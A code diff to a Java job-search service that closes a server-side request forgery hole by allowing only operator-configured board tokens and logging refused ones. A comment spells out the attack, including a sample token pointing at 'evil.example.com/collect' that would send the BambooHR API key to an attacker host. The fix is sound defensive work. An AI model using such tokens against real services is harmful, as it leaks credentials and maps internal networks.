@@ -56,6 +56,7 @@ import java.util.Locale;
 import java.util.Map;
 import java.util.Set;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicLong;
 import java.util.regex.Pattern;
 
 @Service
@@ -348,6 +349,8 @@ public class CandidateJobSearchService {
                 "positions"
             );
 
+    private static final Duration REFUSED_BOARD_LOG_INTERVAL = Duration.ofMinutes(1);
+
     private final ExternalJobPostingStore externalJobPostingStore;
     private final GreenhouseJobBoardClient greenhouseClient;
     private final LeverJobBoardClient leverClient;
@@ -376,6 +379,12 @@ public class CandidateJobSearchService {
     private final int maxLiveFallbackSources;
     private final int liveFallbackSourceConcurrency;
     private final Map<String, RankedJobsCacheEntry> personalizedRankingCache = new ConcurrentHashMap<>();
+    // Refusing a board token is the interesting event, and it is also the one an
+    // outsider controls the rate of. One WARN per interval carries the running
+    // total, so a scan is visible in the log without being able to bury the rest
+    // of it; the individual refusals stay at DEBUG.
+    private final AtomicLong refusedBoardTokens = new AtomicLong();
+    private final AtomicLong lastRefusedBoardLogMillis = new AtomicLong();
 
     public CandidateJobSearchService(
             ExternalJobPostingStore externalJobPostingStore,
@@ -1205,6 +1214,10 @@ public class CandidateJobSearchService {
     }
 
     private boolean liveFallbackAllowed(String source, String boardToken) {
+        if (!boardTokenAllowedForLiveFallback(source, boardToken)) {
+            return false;
+        }
+
         int sourceCount = countLiveFallbackSources(source, boardToken);
         if (sourceCount <= maxLiveFallbackSources) {
             return true;
@@ -1219,8 +1232,99 @@ public class CandidateJobSearchService {
         return false;
     }
 
+    /**
+     * Whether a request-supplied board token may steer the live fallback.
+     *
+     * <p>GET /api/candidate/jobs/** is permitAll, so source and board arrive
+     * from anyone on the internet, and the fallback fires exactly when the
+     * database returned nothing -- which an unrecognised token always does.
+     * countLiveFallbackSources below then answered 1 for any token on a named
+     * source, so the request, not the operator, chose the host we called:
+     * WORKDAY parses the token as host|tenant|site and POSTs to that host,
+     * JOBVITE/ICIMS/JAZZHR hand it to CareerPageJobBoardClient.fetchPage as a
+     * whole URL whose only test is an https:// prefix, and BAMBOOHR splices it
+     * into the authority as "https://" + token + ".bamboohr.com", so a token
+     * of "evil.example.com/collect?a=" resolves to evil.example.com and takes
+     * the Authorization header holding our BambooHR key with it. Response
+     * timing and empty-versus-parsed bodies map whatever the service can reach
+     * over TLS; the BambooHR branch does not even need the reply.
+     *
+     * <p>Only tokens an operator configured are allowed through, matched the
+     * way the connectors normalise them -- trimmed, ignoring case, since
+     * resolveBoardToken lowercases and every other summary path trims. Rows in
+     * external_job_sources are deliberately not consulted: they are
+     * operator-controlled and would be defensible, but reading them means a
+     * database round trip inside a synchronous gate, and they already reach the
+     * network through fetchForSync, which the scheduler drives rather than a
+     * request. The cost is that a seeded board with no property entry and no
+     * synced rows yet now answers empty instead of being fetched live, until
+     * the next sync or until someone adds it to the list for its source.
+     *
+     * <p>ALL is left alone, which is also where the legitimate traffic is: the
+     * portal and the website both send source=all. Its other branches ignore
+     * the token entirely, and the one that does not -- Greenhouse -- spends it
+     * as a path segment on a fixed base URL, so it selects no host.
+     */
+    private boolean boardTokenAllowedForLiveFallback(String source, String boardToken) {
+        if (boardToken == null || boardToken.isBlank()) {
+            return true;
+        }
+
+        String normalizedSource = normalizeSource(source);
+        if ("ALL".equals(normalizedSource)) {
+            return true;
+        }
+
+        String candidate = boardToken.trim();
+        boolean configured = configuredBoardTokens(normalizedSource).stream()
+                .anyMatch(value -> value.equalsIgnoreCase(candidate));
+        if (!configured) {
+            logRefusedBoardToken(normalizedSource, candidate);
+        }
+        return configured;
+    }
+
+    /** The tokens an operator configured for one source; empty for a source with no list. */
+    private List<String> configuredBoardTokens(String normalizedSource) {
+        return switch (normalizedSource) {
+            case "GREENHOUSE" -> configuredValues(greenhouseBoards, defaultGreenhouseBoard);
+            case "LEVER" -> configuredValues(leverSites, null);
+            case "ASHBY" -> configuredValues(ashbyBoards, null);
+            case "SMARTRECRUITERS" -> configuredValues(smartRecruitersCompanies, null);
+            case "WORKABLE" -> configuredValues(workableAccounts, null);
+            case "WORKDAY" -> configuredValues(workdaySources, null);
+            case "BAMBOOHR" -> configuredValues(bambooHrCompanies, null);
+            case "JOBVITE" -> configuredValues(jobvitePages, null);
+            case "ICIMS" -> configuredValues(icimsPages, null);
+            case "JAZZHR" -> configuredValues(jazzHrPages, null);
+            default -> List.of();
+        };
+    }
+
+    private void logRefusedBoardToken(String normalizedSource, String boardToken) {
+        long total = refusedBoardTokens.incrementAndGet();
+        long now = System.currentTimeMillis();
+        long last = lastRefusedBoardLogMillis.get();
+        if (now - last >= REFUSED_BOARD_LOG_INTERVAL.toMillis()
+                && lastRefusedBoardLogMillis.compareAndSet(last, now)) {
+            // The token is echoed so an operator can tell a probe from a board
+            // someone forgot to configure, but it is attacker text: trimmed to a
+            // sample and kept on one line so it cannot forge log records.
+            String sample = boardToken.length() > 80 ? boardToken.substring(0, 80) + "..." : boardToken;
+            log.warn(
+                    "Refusing live fallback for source={} board={} because it is not configured ({} refused so far)",
+                    normalizedSource,
+                    sample.replace('\r', ' ').replace('\n', ' '),
+                    total);
+            return;
+        }
+        log.debug("Refusing live fallback for source={} because the board is not configured", normalizedSource);
+    }
+
     private int countLiveFallbackSources(String source, String boardToken) {
         String normalizedSource = normalizeSource(source);
+        // Reached only for a token boardTokenAllowedForLiveFallback recognised,
+        // so this is one configured board and not whatever the caller asked for.
         if (boardToken != null && !boardToken.isBlank() && !"ALL".equals(normalizedSource)) {
             return 1;
         }
